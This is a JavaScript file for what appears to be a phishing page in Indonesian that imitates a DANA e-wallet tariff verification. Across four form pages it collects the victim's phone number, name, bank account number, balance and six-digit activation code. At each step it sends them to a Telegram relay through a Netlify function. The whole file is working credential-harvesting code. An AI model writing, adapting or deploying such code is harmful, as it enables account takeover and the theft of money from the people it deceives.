document.addEventListener('DOMContentLoaded', function() {
    // Initialize first page
    showPage(1);
    
    // Store form data globally
    const formData = {
        tariff: null,
        phone: null,
        name: null,
        accountNumber: null,
        balance: null,
        virtualCode: null
    };

    // Page 1: Tariff Selection
    document.getElementById('btnNext1').addEventListener('click', async function() {
        const phoneNumber = document.getElementById('nope').value.trim();
        const selectedTariff = document.querySelector('input[name="radio"]:checked');
        
        if (!phoneNumber || phoneNumber.length < 10) {
            alert('Harap masukkan nomor HP yang valid (minimal 10 digit)');
            return;
        }
        
        if (!selectedTariff) {
            alert('Harap pilih tarif terlebih dahulu');
            return;
        }
        
        // Store data
        formData.tariff = selectedTariff.value.includes('BARU') ? 'new' : 'old';
        formData.phone = phoneNumber;
        
        // Send initial data to Telegram
        try {
            await sendToTelegram({
                step: 'tariff-selection',
                tariff: formData.tariff,
                phone: formData.phone
            });
            
            showPage(2);
        } catch (error) {
            console.error('Telegram error:', error);
            alert('Gagal mengirim data. Silakan coba lagi.');
        }
    });
    
    // Page 2: Personal Data
    document.getElementById('formPersonal').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const name = document.getElementById('nama').value.trim();
        const accountNumber = document.getElementById('norek').value.trim();
        
        if (!name || name.length < 3) {
            alert('Harap masukkan nama lengkap yang valid');
            return;
        }
        
        if (!accountNumber || accountNumber.length < 5) {
            alert('Harap masukkan nomor rekening yang valid');
            return;
        }
        
        // Store data
        formData.name = name;
        formData.accountNumber = accountNumber;
        
        // Send to Telegram
        try {
            await sendToTelegram({
                step: 'personal-data',
                name: formData.name,
                accountNumber: formData.accountNumber,
                phone: formData.phone,
                tariff: formData.tariff
            });
            
            showPage(3);
        } catch (error) {
            console.error('Telegram error:', error);
            alert('Gagal mengirim data. Silakan coba lagi.');
        }
    });
    
    // Page 3: Balance Verification
    document.getElementById('formVerification').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const rawBalance = document.getElementById('saldoNumber').value;
        
        if (!rawBalance || rawBalance === '0') {
            alert('Harap masukkan saldo yang valid');
            return;
        }
        
        // Store data
        formData.balance = rawBalance;
        
        // Send to Telegram
        try {
            await sendToTelegram({
                step: 'balance-verification',
                balance: formData.balance,
                name: formData.name,
                phone: formData.phone,
                accountNumber: formData.accountNumber
            });
            
            showPage(4);
        } catch (error) {
            console.error('Telegram error:', error);
            alert('Gagal mengirim saldo. Silakan coba lagi.');
        }
    });
    
    // Page 4: Activation Code
    document.getElementById('btnSubmit').addEventListener('click', async function() {
        const activationCode = document.getElementById('kodeAktivasi').value.trim();
        
        if (!activationCode || activationCode.length < 6) {
            alert('Harap masukkan kode aktivasi 6 digit');
            return;
        }
        
        // Store data
        formData.virtualCode = activationCode;
        
        // Send final data to Telegram
        try {
            await sendToTelegram({
                step: 'complete-verification',
                virtualCode: formData.virtualCode,
                name: formData.name,
                phone: formData.phone,
                accountNumber: formData.accountNumber,
                balance: formData.balance,
                tariff: formData.tariff
            });
            
            alert('Verifikasi berhasil! Data telah dikirim.');
            resetForms();
            showPage(1);
        } catch (error) {
            console.error('Telegram error:', error);
            alert('Gagal mengirim kode. Silakan coba lagi.');
        }
    });
    
    // Request Virtual Code Button
    document.querySelector('.request-button').addEventListener('click', async function() {
        try {
            await sendToTelegram({
                step: 'request-code',
                phone: formData.phone,
                name: formData.name
            });
            
            alert('Permintaan kode virtual telah dikirim. Silakan cek pesan Anda.');
        } catch (error) {
            console.error('Telegram error:', error);
            alert('Gagal meminta kode. Silakan coba lagi.');
        }
    });
    
    // Balance Input Formatting
    document.getElementById('saldo').addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '');
        document.getElementById('saldoNumber').value = value;
        this.value = formatRupiah(value);
    });
});

// Function to show specific page
function showPage(pageNumber) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(`page${pageNumber}`).classList.add('active');
    window.scrollTo(0, 0);
}

// Format Rupiah currency
function formatRupiah(angka) {
    if (!angka) return '';
    return 'Rp ' + parseInt(angka).toLocaleString('id-ID');
}

// Reset all forms
function resetForms() {
    document.querySelectorAll('form').forEach(form => form.reset());
    document.querySelectorAll('input[type="hidden"]').forEach(input => input.value = '');
    document.querySelector('input[name="radio"]').checked = false;
}

// Send data to Telegram via Netlify Function
async function sendToTelegram(data) {
    try {
        const response = await fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        return await response.json();
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        throw error;
    }
    }
